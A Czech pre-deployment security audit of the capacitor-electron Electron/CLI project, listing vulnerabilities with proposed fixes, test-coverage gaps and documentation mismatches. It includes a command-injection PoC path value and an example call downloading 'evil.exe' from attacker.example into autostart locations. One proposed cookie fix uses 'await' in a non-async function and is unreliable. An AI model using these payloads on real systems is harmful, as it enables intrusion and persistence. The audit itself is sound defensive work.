# Audit před nasazením — capacitor-electron v0.3.0

Datum: 2026-07-10
Rozsah: CLI nástroje (`src/cli`), Electron main-process šablona (`src/template-electron`), testová sada (`tests/`), dokumentace (`docs/`, README, CHANGELOG, SECURITY, TESTING, CONTRIBUTING).

Metoda: čtyři paralelní hloubkové průzkumy — pokrytí testy, konzistence dokumentace vs. kód, bezpečnost/korektnost CLI, bezpečnost main-procesu Electronu — se zaměřením na ověřitelná zjištění (čtení skutečného kódu, ne odhady).

**Klíčové pozorování:** nejzávažnější bezpečnostní díry leží přesně v souborech, které nemají žádné testy. To není náhoda — je to vzorec hodný zapamatování pro budoucí review proces.

---

## 🔴 Kritické nálezy

### 1. Command injection v `kill.ts`

**Soubor:** `src/cli/kill.ts:33`

Unix větev staví shell příkaz pomocí `JSON.stringify` jako "quoting":

```ts
execSync(`pgrep -f ${JSON.stringify(capacitorRoot)}`);
```

`JSON.stringify` **není** bezpečné shell-quoting — uvozovky escapuje jen pro JS/JSON kontext, ne pro shell. Ověřeno funkčním PoC:

```
capacitorRoot = '/tmp/proj$(touch /tmp/PWNED_PROOF)'
```

→ vnořená command substituce se spustí.

Windows větev ve stejném souboru problém nemá (skutečný PowerShell parametr, žádná stringová interpolace) — jde tedy o nekonzistentní, vyhnutelnou regresi jen na Unix větvi.

**Návrh opravy** — nahradit `execSync` + interpolaci za `execFileSync` s argument polem (žádný shell se nespouští, žádná injekce možná):

```ts
import { execFileSync } from 'node:child_process';

// misto:
// execSync(`pgrep -f ${JSON.stringify(capacitorRoot)}`);

// pouzit:
let output: string;
try {
  output = execFileSync('pgrep', ['-f', capacitorRoot], { encoding: 'utf8' });
} catch (err) {
  // pgrep vraci exit code 1, kdyz nic nenajde - to neni chyba
  if ((err as { status?: number }).status === 1) {
    output = '';
  } else {
    throw err;
  }
}
```

Stejný princip zkontrolovat i u ostatních `execSync`/`exec` volání v souboru (pokud existují), kde by se cesta k projektu nebo jiná proměnná mohla dostat do shell stringu.

---

### 2. Neověřený arbitrary file write přes `downloads.start`

**Soubor:** `src/template-electron/src/system/static/electron-api/downloads-main.ts:73-92` (handler) a `:47-52` (`attachDownload`)

```ts
trustedIpcHandle('downloads:start', (e, opts: { url: string; savePath?: string }) => {
  const win = senderWindow(e);
  const parsed = new URL(String(opts?.url ?? ''));
  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error(/* ... */);
  const url = parsed.href;
  const state: DownloadState = {
    // ...
    savePath: opts?.savePath,   // <-- syrovy vstup z rendereru, nikdy nevalidovan
    // ...
  };
  enqueuePending(state);
  win.webContents.downloadURL(url);
  return { ...state };
});

function attachDownload(win, item, initial) {
  const state = initial;
  // ...
  if (state.savePath) item.setSavePath(state.savePath);   // <-- zapis kamkoli
  // ...
}
```

`opts.savePath` jde bez jediné kontroly do `DownloadItem.setSavePath()`. Žádný allowlist adresáře, žádná kontrola traversal, žádný save dialog. `url` je omezen na http/https, ale obsah je jinak plně útočníkem volitelný.

**Scénář zneužití:** jakýkoli skript běžící v trusted origin (XSS v app webu, kompromitovaná npm/web závislost, vzdálený hybridní obsah) může zavolat:

```js
window.Electron.downloads.start({
  url: 'https://attacker.example/evil.exe',
  savePath: '<Startup folder>/evil.exe'   // nebo ~/.bashrc, ~/Library/LaunchAgents/x.plist ...
})
```

→ zápis libovolných bajtů kamkoli, kam má OS uživatel práva, včetně autostart lokací. Přímá eskalace XSS → persistence/RCE.

**Návrh opravy** — omezit `savePath` na podadresář povoleného kořene (typicky `app.getPath('downloads')`), odmítnout absolutní cesty mimo něj:

```ts
import path from 'node:path';
import { app } from 'electron';

function resolveSafeSavePath(requested: string | undefined, suggestedName: string): string | undefined {
  if (!requested) return undefined;
  const downloadsRoot = path.resolve(app.getPath('downloads'));
  const candidate = path.resolve(downloadsRoot, requested);
  const relative = path.relative(downloadsRoot, candidate);
  const isInside = relative === '' || (!relative.startsWith('..') && !path.isAbsolute(relative));
  if (!isInside) {
    throw new Error(`downloads:start - savePath must resolve inside ${downloadsRoot}`);
  }
  return candidate;
}

// v handleru:
const state: DownloadState = {
  // ...
  savePath: resolveSafeSavePath(opts?.savePath, /* navrhovany nazev souboru */ ''),
  // ...
};
```

Alternativa (bezpečnější a jednodušší): parametr `savePath` úplně odstranit a vždy nechat uživatele vybrat cíl přes nativní `dialog.showSaveDialog`, případně ho volitelně zapnout jen jako `boolean useSaveDialog`.

---

## 🟠 Vysoká závažnost

### 3. `session:getCookies` obchází HttpOnly ochranu + neomezený proxy/UA override

**Soubor:** `src/template-electron/src/system/static/electron-api/session-main.ts:12,14,17`

```ts
trustedIpcHandle('session:getCookies', (e, filter: Electron.CookiesGetFilter) => ses(e).cookies.get(filter ?? {}));
```

Electron `session.cookies.get()` (na rozdíl od `document.cookie`) umí číst i `httpOnly` a `secure` cookies. Vystavením 1:1 na `window.Electron.session.getCookies()` může jakékoli XSS v trusted origin vytáhnout session cookie, kterou HttpOnly měl chránit — DOM XSS se tak mění na plnou exfiltraci session/session hijacking.

Stejný soubor navíc bez omezení vystavuje:
- `session:setProxy` (řádek 14) — XSS může přesměrovat veškerý síťový provoz přes útočníkův proxy (MITM primitivum)
- `session:setUserAgent` (řádek 12)

**Návrh opravy:**

1. `getCookies` — pokud renderer skutečně potřebuje číst cookies, omezit na non-HttpOnly a jen pro `url` odpovídající aktuálnímu originu okna, nebo tuto funkci úplně odebrat z povrchu vystaveného rendereru (přesunout use-case do main-procesu, pokud existuje legitimní důvod).

```ts
trustedIpcHandle('session:getCookies', (e, filter: Electron.CookiesGetFilter) => {
  // zakaz cist HttpOnly cookies z rendereru
  const cookies = await ses(e).cookies.get(filter ?? {});
  return cookies.filter(c => !c.httpOnly);
});
```

2. `setProxy` / `setUserAgent` — pokud jsou nutné, vyžadovat, aby byly zapnuté explicitní config flagem (`capacitor.config.json`) analogicky k `external commands allowedArgs`, a v produkci defaultně vypnuté, případně omezit na hodnoty z allowlistu definovaného vývojářem, ne libovolné z rendereru.

```ts
trustedIpcHandle('session:setProxy', (e, config: Electron.ProxyConfig) => {
  if (!appConfig().session?.allowRendererProxyControl) {
    throw new Error('session:setProxy is disabled by config');
  }
  return ses(e).setProxy(config);
});
```

---

### 4. Path traversal přes `webDir` v `copy.ts`

**Soubor:** `src/cli/copy.ts:53` (`getWebDir`)

```ts
path.join(capacitorRoot, cfg.webDir)
```

`path.join` nezabraňuje traversal — ověřeno: `path.join('/Users/me/myproject', '../../../../../etc')` se vyhodnotí na `/etc`. Na rozdíl od icon/tray/splash assetů (validovaných přes `isInsideDir` v `update.ts`) se `webDir` zapisuje do `electron/capacitor.config.json` bez sanitizace — poškozená nebo úmyslně škodlivá hodnota `webDir` v `capacitor.config.json` může zabalit libovolný adresář hostitele do vydávané Electron aplikace.

Větev s proměnnou prostředí `CAPACITOR_WEB_DIR` je ještě přímější — vůbec žádný join/validace.

**Návrh opravy** — použít stejný `isInsideDir` guard, jaký se už používá jinde v `update.ts`:

```ts
function isInsideDir(parentDir: string, candidatePath: string): boolean {
  const parent = path.resolve(parentDir);
  const candidate = path.resolve(candidatePath);
  const relative = path.relative(parent, candidate);
  return relative === '' || (!!relative && !relative.startsWith('..') && !path.isAbsolute(relative));
}

function getWebDir(capacitorRoot: string, cfg: CapacitorConfig): string {
  const raw = process.env.CAPACITOR_WEB_DIR ?? cfg.webDir;
  const resolved = path.resolve(capacitorRoot, raw);
  if (!isInsideDir(capacitorRoot, resolved)) {
    throw new Error(`webDir must resolve inside the project root, got: ${raw}`);
  }
  return resolved;
}
```

---

## 🟡 Střední závažnost

### 5. Arbitrary file write přes `print.printToPDF({ path })`

**Soubor:** `src/template-electron/src/system/static/electron-api/print-main.ts:22-31`

```ts
trustedIpcHandle('print:printToPDF', async (e, opts) => {
  const data = await win(e).webContents.printToPDF(opts?.options ?? {});
  if (opts?.path) {
    const dest = path.resolve(opts.path);       // zadny allowlist / traversal check
    await fs.mkdir(path.dirname(dest), { recursive: true }); // libovolny mkdir -p
    await fs.writeFile(dest, data);              // libovolny prepis souboru
    return { path: dest };
  }
  // ...
});
```

Stejný vzor jako nález #2 — chybí validace cíle. Méně přímo zneužitelné (obsah je render aktuální stránky, ne útočníkem volený binární obsah), ale pořád jde o write/overwrite primitivum reachable z trusted-origin skriptu.

**Návrh opravy** — analogicky k #2, omezit na povolený kořenový adresář:

```ts
function resolveSafePrintPath(requested: string): string {
  const documentsRoot = path.resolve(app.getPath('documents'));
  const dest = path.resolve(documentsRoot, requested);
  const relative = path.relative(documentsRoot, dest);
  const isInside = relative === '' || (!relative.startsWith('..') && !path.isAbsolute(relative));
  if (!isInside) {
    throw new Error(`print:printToPDF - path must resolve inside ${documentsRoot}`);
  }
  return dest;
}
```

Alternativa: odebrat `path` parametr úplně a vracet PDF data rendereru, který si zápis na disk (přes `dialog.showSaveDialog`) řeší sám.

---

### 6. Nedostatečně omezené `webPreferences` z konfigurace

**Soubory:** `src/template-electron/main.ts:85,108-113`, `src/template-electron/src/system/shared/types.ts:184-199`

```ts
// main.ts
const configuredWebPreferences = browserWindowConfig.webPreferences ?? {};
// ...
webPreferences: {
  ...configuredWebPreferences,
  contextIsolation: true,
  nodeIntegration:  false,
  preload:          path.join(__dirname, 'preload.cjs'),
},
```

```ts
// types.ts
export interface SafeWebPreferences {
  sandbox?: boolean;         // zdokumentovany, zamerny "escape hatch"
  preload?: never;
  contextIsolation?: never;
  nodeIntegration?: never;
  [key: string]: unknown;    // <-- vsechno ostatni prochazi bez omezeni
}
```

`contextIsolation`, `nodeIntegration`, `preload` jsou správně vynucené a nepřepsatelné. Ale `sandbox`, `webSecurity`, `allowRunningInsecureContent`, `experimentalFeatures`, `nodeIntegrationInSubFrames` atd. procházejí nefiltrovaně z `capacitor.config.json` díky `[key: string]: unknown`. TS typ chrání jen autora TS kódu v tomto repu — ne runtime JSON config, který `main.ts` čte přes `JSON.parse`. `sandbox: false` je alespoň zdokumentovaný escape hatch; `webSecurity: false` / `allowRunningInsecureContent: true` zdokumentované nejsou a lze je nastavit bez jakéhokoli runtime varování.

Pro srovnání: vedlejší okna v `windows-main.ts:227-234` mají `sandbox: true` napevno a nepřebírají libovolné `webPreferences` — hlavní okno je tedy paradoxně méně zamčené než vedlejší okna vytvářená stejným kódem.

**Návrh opravy** — explicitní allowlist bezpečných klíčů + runtime varování/blokace nebezpečných:

```ts
const DANGEROUS_WEB_PREFERENCE_KEYS = [
  'webSecurity',
  'allowRunningInsecureContent',
  'experimentalFeatures',
  'nodeIntegrationInSubFrames',
  'nodeIntegrationInWorker',
] as const;

function sanitizeWebPreferences(input: Record<string, unknown>): Record<string, unknown> {
  const result = { ...input };
  for (const key of DANGEROUS_WEB_PREFERENCE_KEYS) {
    if (key in result) {
      console.warn(
        `[capacitor-electron] webPreferences.${key} is set in capacitor.config.json and will be ignored ` +
        `for security reasons. Remove it from your config.`,
      );
      delete result[key];
    }
  }
  return result;
}

// v main.ts:
webPreferences: {
  ...sanitizeWebPreferences(configuredWebPreferences),
  contextIsolation: true,
  nodeIntegration:  false,
  preload:          path.join(__dirname, 'preload.cjs'),
},
```

Pokud je `webSecurity: false` legitimní potřeba pro některé vývojářské scénáře, zvážit stejný vzor jako u `sandbox` — explicitní, zdokumentovaný, samostatně pojmenovaný config klíč místo prostupu z `webPreferences`.

---

### 7. Ztráta uživatelských dat v `package.json` při `upgrade --all`

**Soubor:** `src/cli/upgrade.ts:153` (`mergePackageJson`)

```ts
merged = { ...tpl, name, version, dependencies, devDependencies, scripts };
```

Tiše přepíše všechna ostatní pole `package.json` (license, author, homepage, bugs, repository...) na šablonové placeholdery. Následné volání `syncElectronPackageMetadata` obnoví jen pole, která existují v root `package.json` — vlastní úpravy, které tam nejsou zrcadlené, se při `upgrade --all` trvale ztratí, bez diffu, zálohy nebo dry-run.

**Návrh opravy** — merge, který zachovává neznámá pole z existujícího souboru a přepisuje jen to, co šablona skutečně vlastní:

```ts
function mergePackageJson(existing: PackageJson, tpl: PackageJson, name: string, version: string): PackageJson {
  const TEMPLATE_OWNED_KEYS = ['dependencies', 'devDependencies', 'scripts'] as const;
  const merged: PackageJson = { ...existing };
  for (const key of TEMPLATE_OWNED_KEYS) {
    merged[key] = tpl[key];
  }
  merged.name = name;
  merged.version = version;
  return merged;
}
```

Dále zvážit: před destruktivní `upgrade --all` operací vypsat diff (které klíče se změní) a vyžádat potvrzení, případně vytvořit `.bak` kopii souboru před přepisem.

---

### 8. Tiché polykání chyb v `ensureAppInit`

**Soubor:** `src/cli/copy.ts:46`

Interní try/catch polyká chyby při zápisu `electron-init.js` / patchování `index.html`; `copy` i tak vypíše hlášku o úspěchu — rozbitý renderer bootstrap se odešle beze slova.

**Návrh opravy** — nepolykat chybu, nebo alespoň propagovat jako viditelné varování, které ovlivní exit code / finální hlášku příkazu:

```ts
async function ensureAppInit(appDir: string): Promise<{ ok: boolean; error?: unknown }> {
  try {
    // ... existujici logika zapisu electron-init.js / patchovani index.html
    return { ok: true };
  } catch (error) {
    return { ok: false, error };
  }
}

// volajici kod (copy.ts):
const initResult = await ensureAppInit(appDir);
if (!initResult.ok) {
  console.error(`⚠ Failed to inject electron-init.js into ${appDir}: ${initResult.error}`);
  process.exitCode = 1; // nebo throw, podle zamysleneho chovani CLI
}
```

---

## 🟢 Nízká / informační

### 9. `protocol:openExternal` vždy povoluje `mailto:`

**Soubor:** `src/template-electron/src/system/static/electron-api/protocol-main.ts:37-43`

```ts
if (!['http:', 'https:', 'mailto:', ...configuredSchemes().map(s => `${s}:`)].includes(parsed.protocol)) {
  throw new Error(/* ... */);
}
```

`mailto:` je napevno povolen bez ohledu na config, i když framework jinde důsledně používá explicitní allowlisty. `shell.openExternal` s útočníkem ovlivněnými `mailto:` URL má na Windows historii zneužití přes neočekávané argumenty předané mail klientovi.

**Návrh opravy** — přesunout `mailto:` z natvrdo povoleného seznamu do volitelné config položky (opt-in, ne opt-out):

```ts
const defaultAllowed = ['http:', 'https:'];
const allowed = [
  ...defaultAllowed,
  ...(appConfig().protocol?.allowMailto ? ['mailto:'] : []),
  ...configuredSchemes().map(s => `${s}:`),
];
if (!allowed.includes(parsed.protocol)) {
  throw new Error(/* ... */);
}
```

### 10. `process-guardian.ts` broadcastuje bez trust kontroly

**Soubor:** `src/template-electron/src/system/static/electron-api/process-guardian.ts:4-14`

```ts
function sendToAllWindows(payload) {
  for (const win of BrowserWindow.getAllWindows()) {
    if (!win.isDestroyed()) {
      try { win.webContents.send('electronError', payload); } catch {}
    }
  }
}
```

Navzdory názvu nejde o žádnou ochranu — bez trust/origin kontroly posílá plné error zprávy a stack trace (obsahují lokální cesty) do *všech* oken. Dnes neškodné, protože vedlejší okna nemají preload/contextBridge a nemají jak zprávu přijmout, ale žádná obrana do budoucna, pokud se to změní.

**Návrh opravy** — omezit odesílání jen na okna se známým, důvěryhodným preloadem (analogicky k `isIpcSenderTrusted` použitému jinde v kódu):

```ts
function sendToAllWindows(payload: unknown) {
  for (const win of BrowserWindow.getAllWindows()) {
    if (win.isDestroyed()) continue;
    if (!isTrustedAppWindow(win)) continue; // napr. kontrola proti registru hlavnich/spravovanych oken
    try { win.webContents.send('electronError', payload); } catch { /* okno se mezitim zavrelo */ }
  }
}
```

### 11. `file-trust.ts` neřeší symlinky

**Soubor:** `src/template-electron/src/system/static/electron-api/file-trust.ts:5-10`

```ts
function isInsideDir(parentDir, candidatePath) {
  const parent = path.resolve(parentDir);
  const candidate = path.resolve(candidatePath);
  const relative = path.relative(parent, candidate);
  return relative === '' || (!!relative && !relative.startsWith('..') && !path.isAbsolute(relative));
}
```

Správně blokuje `../` a encoded traversal na úrovni textové cesty, ale neřeší symlinky (chybí `fs.realpathSync`). Symlink uvnitř `appRoot` směřující ven by prošel jako "trusted". Vyžaduje to ale předchozí zápisový přístup dovnitř app adresáře — vysoká bariéra pro běžného útočníka, spíš doplnění pro defense-in-depth.

**Návrh opravy:**

```ts
function isInsideDir(parentDir: string, candidatePath: string): boolean {
  const parent = path.resolve(parentDir);
  let candidate = path.resolve(candidatePath);
  try {
    candidate = fs.realpathSync(candidate); // rozresi symlinky pred kontrolou
  } catch {
    // soubor jeste neexistuje - realpath na neexistujici cestu selze, pokracujeme s resolve() variantou
  }
  const relative = path.relative(parent, candidate);
  return relative === '' || (!!relative && !relative.startsWith('..') && !path.isAbsolute(relative));
}
```

### 12. Neatomická výměna adresáře v `copy.ts`

**Soubor:** `src/cli/copy.ts:34-39`

`rm(appDir)` následované `cp(webDir, appDir)` — pád uprostřed operace nechá `electron/app/` chybějící nebo poloviční, bez možnosti obnovy.

**Návrh opravy** — kopírovat do dočasného adresáře a až po úspěchu atomicky přejmenovat:

```ts
const tmpDir = `${appDir}.tmp-${Date.now()}`;
await fs.cp(webDir, tmpDir, { recursive: true });
await fs.rm(appDir, { recursive: true, force: true });
await fs.rename(tmpDir, appDir);
```

(`fs.rename` na stejném filesystému je atomické; při selhání `cp` do `tmpDir` zůstává originální `appDir` nedotčený.)

### 13. Mrtvý kód v `open.ts`

**Soubor:** `src/cli/open.ts`

Zabudováno do `dist/cli/open.js`, ale `index.ts` routuje příkaz `open` na `run.js` — `open.js` je nedosažitelný přes publikovaný `cap-electron` binary.

**Návrh opravy** — buď odstranit `src/cli/open.ts` a jeho build entry, nebo (pokud šlo o zamýšlené chování) opravit routing v `index.ts` tak, aby `open` skutečně volal `open.js`. Rozhodnutí záleží na tom, co bylo zamýšleno — doporučuji ověřit u autora před smazáním.

---

## Co je v pořádku (ověřeno, nemění se)

- `contextIsolation: true` / `nodeIntegration: false` jsou skutečně nepřepsatelné, u hlavního i vedlejších oken.
- Všechny IPC kanály v `electron-api/*.ts` jdou přes `trustedIpcHandle`/`trustedIpcOn` (ověřeno grepem — žádný raw `ipcMain.handle`/`.on` obchází sender check).
- Produkční CSP (`csp-main.ts`) nemá `unsafe-inline`/`unsafe-eval` pro skripty; dev CSP je uvolněnější a správně podmíněná `isDev`.
- `app-protocol-main.ts` a `server-main.ts` mají solidní ochranu proti path traversal (`filePath.startsWith(base + path.sep)`), včetně `%2e%2e` a backslash edge cases. `app-protocol-main.ts` je zároveň nejlépe otestovaný soubor v repu (38 test case).
- `secure-storage-main.ts` používá `safeStorage` správně — vyhazuje chybu místo tichého fallbacku na plaintext, soubor má práva 0o600.
- `window-state.ts` důkladně validuje persistované rozměry okna (konečná čísla, limity velikosti, kontrola viditelnosti na obrazovce) — žádný bug s oknem mimo obrazovku.
- `external-commands-main.ts` běží bez shellu (`shell: false`), s limitem počtu/délky argumentů a volitelným allowlistem argumentů.
- `update-helpers.ts` validace identifikátorů (`assertJsIdentifier`, `assertPackageName`, `assertSafeString`) je dobře navržená proti code-gen injekci do generovaných registrací pluginů.
- `updater-main.ts` deleguje ověření podpisu/HTTPS na `electron-updater`, což řeší korektně; žádná cesta k downgrade útoku (`allowDowngrade`/`allowPrerelease` výchozí `false`).
- `deep-link-main.ts` normalizuje a limituje délku vstupních URL a přeposílá jen URL odpovídající nakonfigurovanému schématu.
- `pm.ts` detekce package manageru a Windows implementace `kill.ts` jsou v pořádku.
- Dokumentace (deep-linking, CSP, auto-updater, file-transfer, privacy-screen, window-state, global-shortcuts, architecture.md) byla křížově ověřena proti zdrojovému kódu řádek po řádku — bez rozporů v API signaturách ani konfiguračních klíčích.

---

## Mezery v testovém pokrytí

### Přímá korelace s bezpečnostními nálezy

`downloads-main.ts` (nález #2), `print-main.ts` (nález #5) a `session-main.ts` (nález #3) **nemají žádné testy** ověřující jejich skutečnou logiku (jen triviální čisté helpery, pokud vůbec). To je pravděpodobně důvod, proč tyto díry nikdo nezachytil.

### Bez pokrytí — security-relevantní (Electron main-process)

| Soubor | Poznámka |
|---|---|
| `process-guardian.ts` | 0 testů, obsahuje nález #10 |
| `session-main.ts` | 0 testů, obsahuje nález #3 |
| `server-main.ts` | 0 testů — má vlastní path-traversal guard, který nikdo neregresně netestuje |
| `auto-launch-main.ts` | 0 testů — kontroluje OS autostart |
| `deep-link-main.ts` | Shallow — testuje se jen čistý validátor URL (`normalizeDeepLinkUrl`), ne skutečné `setupDeepLinking`, `flushDeepLink`, `consumeLaunchUrl`, zpracování `open-url`/`second-instance` eventů |
| `electron-preload.ts` (320 řádků) | 0 testů — **celý** `contextBridge` povrch vystavený rendereru (`window.Electron.*`) nemá jediný test |
| `menu-main.ts` (327 řádků) | 0 testů — největší netestovaný soubor v repu, obsahuje validaci IPC payloadů (`normalizeContextTargetPayload` aj.) |
| `main.ts` (309 řádků) | 0 testů — bootstrap aplikace (vytváření oken, orchestrace CSP/deep-link/protocol/menu) |
| `functions.ts` → `loadConfig()` | Nikdy netestováno přímo — všude v ostatních testech jen mockováno, přitom podkládá config pro CSP, protocol allowlist, secure storage key mode, external commands |
| `desktop-capture-main.ts`, `dialogs-main.ts`, `native-theme-main.ts`, `power-monitor-main.ts`, `power-save-blocker-main.ts`, `screen-main.ts`, `system-main.ts`, `tray-main.ts` | 0 testů (menší IPC-bridge soubory) |

### Bez pokrytí — CLI (7 z 16 souborů)

`add.ts`, `build.ts`, `kill.ts` (obsahuje nález #1!), `open.ts`, `prepare.ts`, `run.ts` (326 řádků — největší CLI workflow, spouští dev server/watch/restart Electronu), `upgrade.ts` (obsahuje nález #7).

### Bez pokrytí — capacitor-api (11 z 17 souborů)

`action-sheet-main.ts`, `app-main.ts` (135 ř.), `browser-main.ts` (128 ř.), `capacitor-preload.ts` (235 ř. — celý dispatch bridge Capacitor pluginů), `config-main.ts`, `device-main.ts`, `dialog-main.ts`, `file-transfer-main.ts` (131 ř.), `file-viewer-main.ts`, `privacy-screen-main.ts`, `toast-main.ts`.

### Dobře pokryté (pro srovnání, není třeba měnit)

`app-protocol-main.ts` (38 testů), `csp-main.ts`, `protocol-main.ts`, `secure-storage-main.ts`, `file-trust.ts`, `filesystem-main.ts` (33 testů, cíleně na path traversal), `in-app-browser-main.ts` (49 testů), `window-state.ts`, `windows-main.ts`, `update-helpers.ts` (57 test case), `metadata.ts`, `pm.ts`, `shortcuts-main.ts`, `local-notifications-main.ts`.

### Doporučené pořadí doplnění testů

1. `downloads-main.ts`, `session-main.ts`, `print-main.ts` — přímo u opravovaných zranitelností, testy zároveň ověří opravu i zabrání regresi.
2. `server-main.ts`, `process-guardian.ts`, `auto-launch-main.ts` — security-relevantní, dnes 0 testů.
3. `electron-preload.ts`, `menu-main.ts`, `main.ts` — největší netestované soubory, vysoké riziko tiché regrese.
4. `kill.ts`, `run.ts`, `upgrade.ts` — CLI soubory s reálným rizikem (injection, workflow, destruktivní operace).

---

## Nesrovnalosti v dokumentaci

| # | Soubor | Problém |
|---|--------|---------|
| D1 | `README.md:45` | Příklad "pin na konkrétní verzi" doporučuje `npm install --save-dev @devioarts/capacitor-electron@0.1.1`. Podle `SECURITY.md` dostávají bezpečnostní opravy jen `0.3.x` ("< 0.3 → No"). Dokumentace tak navádí bezpečnostně uvažujícího čtenáře na nepodporovanou verzi. **Návrh opravy:** aktualizovat příklad na aktuální podporovanou verzi (`0.3.0`) nebo na obecný placeholder `<verze>` s odkazem na CHANGELOG. |
| D2 | `TESTING.md:3` | Hlavička `> Version: 0.1.1 \| Updated: 2026-06-20` neodpovídá obsahu souboru (pokrývá funkce z 0.2.0/0.3.0 jako secure storage, protocols, external commands). Nebyla aktualizována přes dva release. **Návrh opravy:** buď hlavičku odstranit úplně (verze dokumentu nemusí sledovat verzi balíčku), nebo ji automatizovaně synchronizovat s `package.json` verzí v rámci release procesu. |
| D3 | Chybí dokumentace `cap-electron prepare` | Reálný, registrovaný příkaz (`src/cli/index.ts` → `src/cli/prepare.ts`), zmíněný v CHANGELOG 0.2.0 jako "Added", ale chybí v README "Commands" tabulce, CONTRIBUTING.md i TESTING.md "CLI Commands" tabulce. **Návrh opravy:** doplnit řádek do všech tří tabulek s popisem, co příkaz dělá a kdy ho volá Capacitor lifecycle. |
| D4 | Nezdokumentované npm skripty | `lint`, `test`, `test:unit`, `test:integration`, `test:all`, `test:watch`, `test:e2e`, `release` se nevyskytují v žádném dokumentu (ověřeno grepem přes README/CONTRIBUTING/TESTING/docs). CONTRIBUTING.md checklist před PR zmiňuje jen `npm run build` + `npm run typecheck`, testy vůbec ne. **Návrh opravy:** doplnit sekci "Available scripts" do CONTRIBUTING.md nebo TESTING.md a rozšířit pre-PR checklist minimálně o `npm run test:unit` (ideálně i `test:integration`). |

**Ověřeno jako v pořádku** (vypadalo podezřele, ale po ověření sedí): `ELECTRON_PLUGIN_GUIDE.md` (root) vs. `docs/electron-plugin-guide.md` — podobné názvy, ale popisují dva odlišné mechanismy (npm-package auto-registrace vs. app-local manuální registrace); oba přesně odpovídají zdrojovému kódu. Stálo by za zvážení přejmenování/prokřížení odkazů kvůli objevitelnosti, ale nejde o faktickou chybu.

`docs/platform-support.md`, `docs/architecture.md` a dokumentace deep-linking/CSP/auto-updater/file-transfer/privacy-screen/window-state/global-shortcuts byly ověřeny řádek po řádku proti zdrojovému kódu bez rozporů.

---

## Verdikt: **Needs changes před nasazením do business prostředí**

Dva nálezy (#1 command injection v `kill.ts`, #2 arbitrary file write v `downloads-main.ts`) jsou blokující — obě jsou triviálně zneužitelné a mají jasné, levné opravy uvedené výše. Nálezy #3 (cookie leak) a #4 (path traversal v `copy.ts`) doporučuji opravit ve stejném cyklu.

Testové pokrytí bezpečnostně citlivých souborů (`session-main`, `server-main`, `process-guardian`, `auto-launch-main`, `electron-preload.ts`) je potřeba doplnit současně s opravami — v těchto přesně místech vznikly reálné díry, protože nic nekontrolovalo regrese.

**Pozn.: Tento dokument obsahuje pouze návrhy oprav (ukázkový kód). Žádný zdrojový soubor projektu nebyl touto analýzou změněn.**
